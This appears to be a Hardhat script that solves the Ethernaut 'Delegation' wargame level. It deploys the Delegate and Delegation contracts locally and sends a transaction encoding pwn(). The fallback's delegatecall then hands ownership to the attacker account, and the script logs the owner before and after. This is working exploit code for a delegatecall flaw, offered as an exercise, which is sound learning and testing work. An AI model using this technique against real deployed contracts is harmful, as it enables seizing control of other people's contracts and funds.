const { network, deployments, ethers, getNamedAccounts } = require("hardhat");

async function main() {
  const [owner, addr1, addr2] = await ethers.getSigners();
  console.log("Deployer : ", owner.address);

  const Delegate = await ethers.getContractFactory("Delegate");
  const delegate = await Delegate.deploy(owner.address);
  await delegate.deployed();

  const Delegation = await ethers.getContractFactory("Delegation");
  const delegation = await Delegation.deploy(delegate.address);
  await delegation.deployed();

  const hackerDelegate = await delegate.connect(addr1);
  const hackerDelegation = await delegation.connect(addr1);

  // ------------ let's hack -------------
  console.log("owner delegation : ", await hackerDelegation.owner());

  const encodeFunction = new ethers.utils.Interface([
    "function pwn()",
  ]).encodeFunctionData(`pwn`, []);

  //   const encodeFunction = ethers.utils.defaultAbiCoder("pwn");

  await addr1.sendTransaction({
    from: addr1.address,
    to: delegation.address,
    data: encodeFunction,
    gasLimit: ethers.BigNumber.from(`100000`),
  });

  console.log("owner delegation : ", await hackerDelegation.owner());
}

// hh run scripts/ethernaut1.js --network hardhat
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
